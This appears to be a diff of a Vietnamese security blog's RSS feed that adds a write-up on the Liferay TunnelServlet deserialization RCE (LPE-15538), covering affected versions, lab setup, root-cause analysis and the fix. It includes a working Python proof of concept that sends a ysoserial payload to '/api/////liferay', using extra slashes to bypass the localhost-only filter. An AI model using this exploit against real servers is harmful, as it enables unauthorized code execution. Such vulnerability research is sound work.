@@ -123,7 +123,7 @@ file_put_contents($file, $contents);
 <p>Cấu trúc của mỗi đoạn đầu của log như sau:</p>
 <pre tabindex="0"><code>[Date][Error_data]&lt;viewFile&gt;[Error_data]&lt;viewFile&gt;[Error_data]
 </code></pre><p>Trong PHP có nhiều filter chuyển đổi cho nhiều kiểu mã hóa khác nhau. Tất cả đều có tiền tố <a href="https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv" target="_blank" rel="noopener noreffer">convert.iconv.*</a>
- .  Vì cứ 2 byte thì sẽ được 1 char theo mã <code>UTF-16</code> nên khi convert từ <code>UTF16</code> sang <code>UTF-8</code> thì <code>H\0</code> -&gt; <code>H</code>. Do đó ta có thể xóa file log bằng cách truyền vào phía sau mỗi ký tự của payload một NULL byte (<code>\0</code>) sau đó chuyển đổi bảng mã từ  <code>UTF-16</code> sang <code>UTF-8</code>. Còn các cặp 2 byte ở <code>[Error_data]</code> sẽ bị convert thành junk chars giống như dưới đây. Sau đó phần junk chars này sẽ bị loại bỏ ở bước base64 decoding như đã nói ở phía trên:</p>
+ . Vì cứ 2 byte thì sẽ được 1 char theo mã <code>UTF-16</code> nên khi convert từ <code>UTF16</code> sang <code>UTF-8</code> thì <code>H\0</code> -&gt; <code>H</code>. Do đó ta có thể xóa file log bằng cách truyền vào phía sau mỗi ký tự của payload một NULL byte (<code>\0</code>) sau đó chuyển đổi bảng mã từ  <code>UTF-16</code> sang <code>UTF-8</code>. Còn các cặp 2 byte ở <code>[Error_data]</code> sẽ bị convert thành junk chars giống như dưới đây. Sau đó phần junk chars này sẽ bị loại bỏ ở bước base64 decoding như đã nói ở phía trên:</p>
 <table>
 <thead>
 <tr>
@@ -357,6 +357,128 @@ if __name__ == &#39;__main__&#39;:
 <p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener noreffer">https://www.ambionics.io/blog/laravel-debug-rce</a>
 </p>
 <p><a href="https://knqyf263.hatenablog.com/entry/2021/10/09/165405" target="_blank" rel="noopener noreffer">https://knqyf263.hatenablog.com/entry/2021/10/09/165405</a>
+</p>
+]]></description>
+</item>
+<item>
+    <title>Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)</title>
+    <link>https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code/</link>
+    <pubDate>Wed, 01 May 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code/</guid>
+    <description><![CDATA[<h1 id="liferay-tunnelservlet-deserialization-remote-code-execution-lpe-15538">Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)</h1>
+<ol>
+<li>
+<p>Mô tả và ảnh hưởng</p>
+<p>Liferay TunnelServlet bị lỗ hổng insecure deserialization do cấu hình sai, có thể bị truy cập bởi attacker (theo mặc định, nó chỉ bị giới hạn truy cập từ localhost). Tùy thuộc vào phiên bản của Liferay Portal, attacker có thể khai thác lỗ hổng này bằng cách sử dụng dữ liệu đã được serialized để thực thi mã tùy ý trên hệ thống.</p>
+<p>Các phiên bản ảnh hưởng:</p>
+<ul>
+<li>Liferay Portal CE 7.0 GA3, 7.0.1 GA2, 7.0.2 GA3</li>
+<li>Liferay Portal EE 6.0, 6.0 SP1, 6.0 SP2, 6.1 GA1, 6.1 GA2, 6.1 GA3, 6.2</li>
+<li>Liferay Digital Enterprise 7.0</li>
+</ul>
+</li>
+<li>
+<p>Chuẩn bị môi trường</p>
+<p>Cài đặt phiên bản ảnh hưởng: <a href="https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.1.0%20GA1/liferay-portal-tomcat-6.1.0-ce-ga1-20120106155615760.zip/download" target="_blank" rel="noopener noreffer"><strong>https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.1.0%20GA1/liferay-portal-tomcat-6.1.0-ce-ga1-20120106155615760.zip/download</strong></a>
+</p>
+<p>Giải nén và chạy file <code>..\liferay-portal-6.1.0-ce-ga1\tomcat-7.0.23\bin\startup.bat</code> để khởi chạy server.</p>
+<p></p>
+</li>
+<li>
+<p>Demo khai thác</p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>, <span style="color:#a6e22e">os</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.84:8080&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;java \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-jar ./ysoserial-all.jar CommonsCollections3 calc.exe &gt; payload.bin &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">requests</span>.<span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/////liferay&#34;</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>))
+</span></span></code></pre></div><p></p>
+</li>
+<li>
+<p>Phân tích lỗ hổng</p>
+</li>
+</ol>
+<p>Tại file <code>..\tomcat-7.0.23\webapps\ROOT\WEB-INF\web.xml</code>, ta biết được các request đến <code>/api/liferay/*</code> sẽ được class Tunnel Servlet xử lí.</p>
+<p></p>
+<p></p>
+<p>Đi vào class Tunnel Servlet.</p>
+<p>Tại đây, phương thức <code>doPost</code> dùng để xử lý POST request, TunnelServlet nhận <code>ObjectInputStream</code> từ Post data (dòng 40) và sử dụng hàm <code>readObject()</code> (dòng 52) không đúng cách → Insecure deserialization.</p>
+<p></p>
+<p>Tuy nhiên, các đường dẫn <code>/api/liferay/*</code> mặc định chỉ được truy cập bởi localhost, mọi request từ bên ngoài đều bị filter. Cụ thể, khi truy cập <code>/api/liferay/*</code> thì Tunnel Servlet Filter được sử dụng.</p>
+<p></p>
+<p>Nó được định nghĩa tại class <code>com.liferay.portal.servlet.filters.secure.SecureFilter</code></p>
+<p></p>
+<p>Tại class <code>SecureFilter</code>, hàm <code>processFilter</code> được gọi để thực hiện các quy trình filter. Trong đó có chức năng kiểm tra xem Remote Address có nằm trong whitelist các Allowed host được access hay không bằng hàm <code>isAccessAllowed()</code>. Nếu không thì sẽ bị trả 403 Access denied. Đặt breakpoint như hình và debug.</p>
+<p></p>
+<p>Đặt Breakepoint tại dòng 86 và gửi gón tin POST tới</p>
+<p></p>
+<p>Hit breakpoint</p>
+<p></p>
+<p>F7 để đi vào hàm <code>isAccessAllowed()</code>.</p>
+<p></p>
+<p>Tại đây, ứng dụng sẽ kiểm tra xem <code>remoteAddr</code> (192.168.1.84) có nằm trong mảng whitelist ({SERVER_IP, 127.0.0.1}) <code>hostAllowed</code> hay không → nó không thuộc whitelist → Access denied.</p>
+<p>Tuy nhiên, để bypass filter này ta chỉ cần thêm n dấu <code>/</code> vào path <code>/api/liferay</code> → <code>/api/////liferay</code></p>
+<p></p>
+<p>Khi truy cập endpoint <code>/api/liferay</code>, đầu tiên request sẽ được filter thông qua hàm <code>doFilter()</code> của InvokerFilter class. Sau đó các <code>InvokerFilterChain</code> về urlPattern: <code>/api/liferay/*</code> được lấy để thực hiện filter request. Có thể thấy với /api/liferay thì có đi qua <code>SecureFilter</code>.</p>
+<p></p>
+<p>Còn <code>/api////////liferay</code> thì không:</p>
+<p></p>
+<p>Nguyên nhân nằm ở nơi lấy <code>InvokerFilterChain</code></p>
+<p></p>
+<p>Tại đây phương thức <code>getInvokerFilter()</code>  được gọi để thiết lập filterChain cho url, với các tham số truyền vào là <code>request</code> hiện tại, <code>uri</code> (/api/////liferay) và <code>filterchain</code></p>
+<p>Đi vào phương thức <code>getInvokerFilterChain()</code></p>
+<p></p>
+<p>Phương thức sẽ lấy <code>filterChain</code> từ 1 list có trước (<code>_filterChains</code>), với key chính là hashcode của uri truyền vào.
+Trong trường hợp truyền vào <code>/api////////liferay</code> thì sẽ tạo ra 1 hashcode khác, không tồn tại trong <code>_filterChains</code>, khi đó <code>invokerFilterChain == null</code> và sẽ nhảy tiếp vào phương thức
+<code>_invokerFilterHelper.createInvokerFilterChain()</code> để tạo ra 1 object <code>filterChain</code> mới.</p>
+<p>Đi vào phương thức <code>createInvokerFilterChain()</code></p>
+<p></p>
+<p>Phương thức sẽ check match của uri truyền vào với các filterMap đã có sẵn.</p>
+<p>Chức năng của phương thức <code>isMatch()</code>là check xem uri truyền vào có giống với pattern của rule không, nếu có thì sẽ trả về true và add filter này vào list.</p>
+<p></p>
+<p>Bởi vì giá trị trả về của <code>isMatchURLPattern</code> là false nên filter này sẽ không được add vào <code>invokerFilterChain</code></p>
+<p></p>
+<p>Có thể nhìn thấy được <code>uri</code> truyền vào và <code>urlpattern</code> không match do <code>matchURLPattern</code> trả về false</p>
+<p></p>
+<p>→ <code>SecureFilter</code> không được add vào với request là <code>/api/////////liferay</code></p>
+<p>→ <code>SecureFilter</code> không được invoke nên bị bypass</p>
+<ol start="5">
+<li>Sửa lỗi của NPH.</li>
+</ol>
+<p>Liferay đã thêm một hàm <code>ProtectedClassLoaderObjectInputStream()</code> để filter những authenticated access, và userInputStream.</p>
+<p></p>
+<p>Tại các phiên bản sau, sau khi lấy URI bằng hàm <code>getURI()</code> tại class InvokerFilter Liferay đã thực hiện normalize lại nó bằng hàm <code>HttpComponentsUtil.normalizePath()</code></p>
+<p></p>
+<p></p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 ]]></description>
 </item>
